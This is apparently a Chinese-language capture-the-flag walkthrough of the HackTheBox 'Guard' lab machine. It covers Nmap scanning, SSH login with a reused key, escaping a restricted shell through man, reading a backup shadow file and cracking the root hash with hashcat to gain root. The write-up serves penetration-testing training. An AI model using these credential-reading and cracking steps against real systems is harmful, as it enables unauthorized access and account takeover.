# Guard
###### tags: `HTB_Starting Point`

1. 枚舉(Enumeration)
* 使用Ping指令確認VPN可以正常連線到靶機

![](https://i.imgur.com/Gf0Oulb.png)
由上圖可知，TTL值是63，可以推測目標靶機可能為Linux主機

* 使用Nmap做快速端口掃描，查看哪些Port是開放的，並將結果儲存
	* -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
	*  -v: Increase verbosity level (use -vv or more for greater effect)
	*  --open: Only show open (or possibly open) ports
	*  -p-: to scan ports from 1 through 65535.
	* -T4: You can specify them with the -T option and their number (0–5) or their name. The template names are paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion.
	* -oN: Output scan in normal
```
sudo nmap -n -vv --open -T4 -p- -oN /nmap/Guard.namp 10.10.10.50
```
![](https://i.imgur.com/3UtBMqw.png)

![](https://i.imgur.com/z4O2N8Z.png)

可以發現只有22Port(SSH)是開啟的狀態

* 針對開啟的端口，更進一步使用NSE Scripts掃描(NSE可以像是NMAP的額外套件模組，增加NSE Scripts後，可以讓NMAP變成特定的弱點安全測試攻擊工具，(例如 XSS, CSRF, SQL injection, SSL heatbleed測試等)
	* -sC: equivalent to --script=default
	* -sV: version scan
```
sudo nmap -sC -sV -oN /nmap/Guard_Details -p 22 10.10.10.50
```
![](https://i.imgur.com/MZnxwoU.png)


從上圖結果可以得知，SSH版本信息，以及作業系統為Ubuntu Bionic

* 嘗試使用上一台靶機中Daneil帳戶以及rsa_key登入ssh(因為這是 Linux 機器，所有 Linux 機器都有一個規則：用戶名不能使用大寫字母。)所以我們改用daniel
```
ssh -i id_rsa daniel@10.10.10.50
```


2. 立足點(Foothold)

* 藉由SSH登入，我們獲得了一個一般使用者的帳號daneil
```
ssh -i id_rsa daniel@10.10.10.50
```
![](https://i.imgur.com/fiD3oSy.png)
* 確認一下帳號權限
```
whoami
```
* 接下來嘗試獲得一般使用者的Flag
```
ls -al |grep user.txt
cat user.txt
```
![Uploading file..._dds6y8fvi]()

* 會發現無法使用cat command!，這意味著某些command受到限制。(可以使用man命令生成bash shell並讀取用戶標誌)
```
man ls
shift + 1 
bash
!bash
```
![](https://i.imgur.com/3XIoix7.png)

3. 提權(Privilege Escalation)

* 嘗試探索一下檔案有沒有機敏資料，在/var/backups目錄底下，可以發現一個shadow檔案
```
ls -al /var/backups
```
![Uploading file..._4uj126myh]()

* 查看一下shadow檔案，可以發現root以及加密過後的金鑰
```
cat /var/backups/shadow
```
![](https://i.imgur.com/CN6t5GL.png)

* 將金鑰儲存在本地端Kali，並用Hashcat解密
```
vim hash
hashcat -m 1800 --force hash /usr/share/wordlists/rockyou.txt
```
![Uploading file..._2z13gn85a]()

* 可以得到破密後的金鑰為password#1

![Uploading file..._vuzv75b7r]()

* 使用破密後的帳密登入ssh
```
ssh root@10.10.10.50 
```
![Uploading file..._2l5l71wyv]()

* 獲得root Flag!
```
ls
cat root.txt
```
![Uploading file..._h513b9uni]()
